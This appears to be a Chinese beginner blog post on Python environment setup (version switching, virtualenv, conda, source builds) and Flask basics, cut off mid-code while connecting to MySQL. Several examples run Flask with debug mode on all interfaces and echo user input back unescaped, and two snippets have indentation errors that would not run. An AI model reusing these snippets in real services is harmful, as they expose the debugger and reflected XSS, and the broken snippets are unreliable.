        <content type="html"><![CDATA[<h1 id="python开发环境"><a href="#python开发环境" class="headerlink" title="python开发环境"></a>python开发环境</h1><blockquote><p>python开发后端是最入门的开发（个人觉得），因为python语法简单，第三方库完善，可以轻松胜任后端和机器学习的工作，因此以下便从python的web后端开发、桌面应用开发、安卓应用开发三个方面开始入手，人工智能先不做赘述，之后另开专题讲解。</p></blockquote><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><p>在有些时候，python的使用有特殊的版本要求，比如python2和python3，python3.6和python3.7-3.9和python3.10-~的有些库存在版本要求，这样的话对python的版本的控制便有了要求。以下推荐三种方法来进行版本控制：</p><ol><li>不厌其烦的手动切换环境变量</li><li>通过相关的python库搭建虚拟环境，如virtualenv</li><li>通过Anaconda搭建虚拟环境</li></ol><p>不同的使用情景有不一样的选择，以下举例做一些演示：</p><blockquote><p>当需要手动切换环境变量的情景：CTF中py2和py3的切换、kali的py升级等</p><p>win切换环境变量：</p><p><img src="/posts/35507/1.png" alt="image-20230106235037520"></p><p><img src="/posts/35507/image-20230106235113339.png" alt="image-20230106235113339"></p><p><img src="/posts/35507/image-20230106235133388.png" alt="image-20230106235133388"></p><p><img src="/posts/35507/image-20230106235159997.png" alt="image-20230106235159997"></p><p><img src="/posts/35507/image-20230106235227803.png" alt="image-20230106235227803"></p><p>Scripts文件夹内为pip，根目录下是python，当移动版本优先级时需要同步移动。</p><p>linux更换软连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除python软链接</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /usr/bin/python</span><br><span class="line"><span class="comment"># 删除pip软链接</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /usr/bin/pip</span><br><span class="line"><span class="comment"># 添加python3的软链接</span></span><br><span class="line">$ <span class="built_in">ln</span> -s /usr/local/python3.8.7/bin/python3.8 /usr/bin/python3.8.7</span><br><span class="line"><span class="comment"># 添加 pip3 的软链接</span></span><br><span class="line">$ <span class="built_in">ln</span> -s /usr/local/python3.8.7/bin/pip3.8 /usr/bin/pip3.8.7</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当需要使用python自带的虚拟环境库的环境：需要较为干净的环境打包软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">安装virtualenv库：</span><br><span class="line">$ pip3 install virtualenv </span><br><span class="line"><span class="comment"># 以当前主机py版本新建虚拟环境：</span></span><br><span class="line">$ virtualenv test1</span><br><span class="line"><span class="comment"># 以指定版本新建虚拟环境（~~前提你得有~~</span></span><br><span class="line">$ virtualenv -p /usr/bin/python3.8.7 test2</span><br><span class="line"><span class="comment"># 进入虚拟环境：</span></span><br><span class="line">$ <span class="built_in">source</span> test2/bin/activate</span><br><span class="line"><span class="comment"># 退出虚拟环境：</span></span><br><span class="line">$ deactivate</span><br></pre></td></tr></table></figure><p>以编译方式安装python：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ubuntu live server安装换源：</span></span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/ubuntu</span><br><span class="line"><span class="comment"># ubuntu20.04 LTS换清华源：</span></span><br><span class="line">$ vim /etc/apt/sources.list</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># pip3换源</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.pip</span><br><span class="line">vim ~/.pip/pip.conf</span><br><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 镜像网站下载python3.8.7源码包</span></span><br><span class="line">$ wget http://npm.taobao.org/mirrors/python/3.8.7/Python-3.8.7.tgz</span><br><span class="line"><span class="comment"># 解压安装包</span></span><br><span class="line">$ tar -zxvf Python-3.8.7.tgz</span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line">$ <span class="built_in">cd</span> Python-3.8.7</span><br><span class="line"><span class="comment"># 创建安装目录</span></span><br><span class="line">$ <span class="built_in">mkdir</span> -p /usr/local/python3.8.7</span><br><span class="line"><span class="comment"># 顺序执行以下安装指令</span></span><br><span class="line">$ ./configure --prefix=/usr/local/python3.8.7  --enable-optimizations</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当需要大型项目需要多个组件版本控制的情景时：作品赛</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个名为py38的环境，指定Python版本是3.8</span></span><br><span class="line">conda create --name py38 python=3.8</span><br><span class="line"><span class="comment"># 进入创建的虚拟环境</span></span><br><span class="line">conda activate py38</span><br><span class="line"><span class="comment"># 返回基础环境</span></span><br><span class="line">conda deactivate py38</span><br><span class="line"><span class="comment"># 销毁创建的虚拟环境</span></span><br><span class="line">conda remove --name py38 --all</span><br></pre></td></tr></table></figure></blockquote><h2 id="后端开发举例-flask"><a href="#后端开发举例-flask" class="headerlink" title="后端开发举例-flask"></a>后端开发举例-flask</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装flask</span></span><br><span class="line">pip install flask</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最小的flask应用</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;80&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="修改开发模式配置"><a href="#修改开发模式配置" class="headerlink" title="修改开发模式配置"></a>修改开发模式配置</h3><p>安装gevent库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gevent</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 最小的flask应用</span><br><span class="line">from flask import Flask</span><br><span class="line">from gevent import pywsgi</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server = pywsgi.WSGIServer((&#x27;0.0.0.0&#x27;, 80), app)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><h3 id="创建响应路由"><a href="#创建响应路由" class="headerlink" title="创建响应路由"></a>创建响应路由</h3><p>添加路由相关的方法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_user</span>(<span class="params">name</span>):</span><br><span class="line">   <span class="keyword">if</span> name ==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;hello_admin&#x27;</span>))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;hello_guest&#x27;</span>, guest = name))</span><br></pre></td></tr></table></figure><h3 id="Flask模板页面"><a href="#Flask模板页面" class="headerlink" title="Flask模板页面"></a>Flask模板页面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  我的模板html内容</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; my_str &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; my_int &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; my_array &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; my_dict &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 往模板中传入的数据</span></span><br><span class="line">    my_str = <span class="string">&#x27;Hello Word&#x27;</span></span><br><span class="line">    my_int = <span class="number">1</span></span><br><span class="line">    my_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">    my_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;xiaoming&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,</span><br><span class="line">                           my_str=my_str,</span><br><span class="line">                           my_int=my_int,</span><br><span class="line">                           my_array=my_array,</span><br><span class="line">                           my_dict=my_dict</span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;80&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="Cookie处理"><a href="#Cookie处理" class="headerlink" title="Cookie处理"></a>Cookie处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request <span class="comment"># 注意需导入 make_response</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/set_cookies&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;uuid&quot;</span>, <span class="string">&quot;XJUSEC&quot;</span>,max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get_cookies&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>():</span><br><span class="line">    cookie_1 = request.cookies.get(<span class="string">&quot;uuid&quot;</span>)  <span class="comment"># 获取名字为uuid对应cookie的值</span></span><br><span class="line">    <span class="keyword">return</span> cookie_1</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/delete_cookies&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_cookie</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;del success&quot;</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;uuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;80&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="HTTP方式"><a href="#HTTP方式" class="headerlink" title="HTTP方式"></a>HTTP方式</h3><p>表单页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask连接Mysql<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>GET方法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;/get&quot;</span> <span class="attr">method</span> = <span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>输入id<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;id&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">value</span> = <span class="string">&quot;submit&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>POST方法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;/post&quot;</span> <span class="attr">method</span> = <span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>输入id<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;id&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">value</span> = <span class="string">&quot;submit&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>flask程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request, render_template</span><br><span class="line">from gevent import pywsgi</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">   return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/get&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def get():</span><br><span class="line">   id = request.args.get(&#x27;id&#x27;)</span><br><span class="line">   return &#x27;The id is &#x27;+id</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/post&#x27;,methods = [&#x27;POST&#x27;])</span><br><span class="line">def post():</span><br><span class="line">   id = request.form[&#x27;id&#x27;]</span><br><span class="line">   return &#x27;The id is &#x27;+id</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server = pywsgi.WSGIServer((&#x27;0.0.0.0&#x27;, 80), app)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">   <span class="comment"># 重定向至&quot;/success&quot;</span></span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;success&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;redirected successfully&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="接收文件"><a href="#接收文件" class="headerlink" title="接收文件"></a>接收文件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">   f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">   <span class="built_in">print</span>(request.files)</span><br><span class="line">   f.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], secure_filename(f.filename)))</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;file uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;80&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>该功能大体目录结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|_ __init__.：py自定义库的标志文件，内容为空</span><br><span class="line">|_ Main.py：flask入口</span><br><span class="line">|_ SqlUtils.py：pymysql库的相关方法封装</span><br><span class="line">|_ templates：放置模板组件，用于显示</span><br><span class="line">   |_ index.html：主页，用于选功能</span><br><span class="line">   |_ get.html：查询页面的表单</span><br><span class="line">   |_ result.html：显示查询结果的页面</span><br></pre></td></tr></table></figure><p>Sql的查询举例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_sql</span>(<span class="params">database</span>):</span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(host=<span 